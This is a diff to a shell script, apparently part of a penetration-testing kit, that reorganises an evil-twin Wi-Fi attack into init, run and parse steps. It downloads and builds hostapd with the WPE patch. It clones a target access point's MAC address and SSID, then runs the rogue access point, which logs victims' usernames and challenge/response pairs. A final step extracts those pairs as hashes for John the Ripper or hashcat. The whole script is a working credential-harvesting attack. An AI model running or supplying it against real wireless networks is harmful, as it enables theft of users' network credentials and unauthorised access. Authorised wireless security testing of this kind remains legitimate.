@@ -26,38 +26,50 @@ if [ `id -u` != "0" ]; then
 	exit 1
 fi
 
-# Install and patch hostapd
-mkdir src && cd src
-wget https://raw.githubusercontent.com/aircrack-ng/aircrack-ng/master/patches/wpe/hostapd-wpe/hostapd-2.9-wpe.patch
-wget https://w1.fi/releases/hostapd-2.9.tar.gz
-tar -zxf hostapd-2.9.tar.gz
-cd hostapd-2.9
-patch -p1 < ../hostapd-2.9-wpe.patch
-cd hostapd
-make
-make install
-make wpe
+case "$1" in
+	init)
+		# Install and patch hostapd
+		mkdir src && cd src
+		wget https://raw.githubusercontent.com/aircrack-ng/aircrack-ng/master/patches/wpe/hostapd-wpe/hostapd-2.9-wpe.patch
+		wget https://w1.fi/releases/hostapd-2.9.tar.gz
+		tar -zxf hostapd-2.9.tar.gz
+		cd hostapd-2.9
+		patch -p1 < ../hostapd-2.9-wpe.patch
+		cd hostapd
+		make
+		make install
+		make wpe
 
-# Create certs
-cd /etc/hostapd-wpe/certs
-./bootstrap
-make install
+		# Create certs
+		cd /etc/hostapd-wpe/certs
+		./bootstrap
+		make install
 
-# Modify hostapd-wpe.conf
-sed -i -e "/ssid=/s/=.*/=$ssid/" /etc/hostapd-wpe/hostapd-wpe.conf
-sed -i -e "/interface=/s/=.*/=$interface/" /etc/hostapd-wpe/hostapd-wpe.conf
+		# Modify hostapd-wpe.conf
+		sed -i -e "/ssid=/s/=.*/=$ssid/" /etc/hostapd-wpe/hostapd-wpe.conf
+		sed -i -e "/interface=/s/=.*/=$interface/" /etc/hostapd-wpe/hostapd-wpe.conf
+		;;
+	run)
+		# Set MAC address of the original AP
+		orig_mac=`iwlist "$interface" scan | grep -B 5 "$ssid" | head -n 1 | sed -e 's/.*Address: //'`
+		ip link set "$interface" down
+		if [ "$orig_mac" ]; then
+			ip link set "$interface" address "$orig_mac"
+		else
+			ip link set "$interface" address "$mac"
+		fi
+		ip link set "$interface" up
 
-# Set MAC address of the original AP
-orig_mac=`iwlist "$interface" scan | grep -B 5 "$ssid" | head -n 1 | sed -e 's/.*Address: //'`
-ip link set "$interface" down
-if [ "$orig_mac" ]; then
-	ip link set "$interface" address "$orig_mac"
-else
-	ip link set "$interface" address "$mac"
-fi
-ip link set "$interface" up
-
-# The caught username/challenge/response will be saved in $log_dir/hostapd-wpe.log
-mkdir $log_dir 2>/dev/null 
-cd $log_dir
-hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf
+		# The caught username/challenge/response will be saved in $log_dir/hostapd-wpe.log
+		mkdir $log_dir 2>/dev/null
+		cd $log_dir
+		hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf
+		;;
+	parse)
+		# Remove duplicates and extract hashes
+		# $2 must be 'jtr' or 'hashcat'
+		grep "$2" hostapd-wpe.log | sed 's/.*\s//' | awk -F: '!a[$1]++' > hashes.txt
+		;;
+	*)
+		echo "Option doesn't exist. Read the script."
+esac
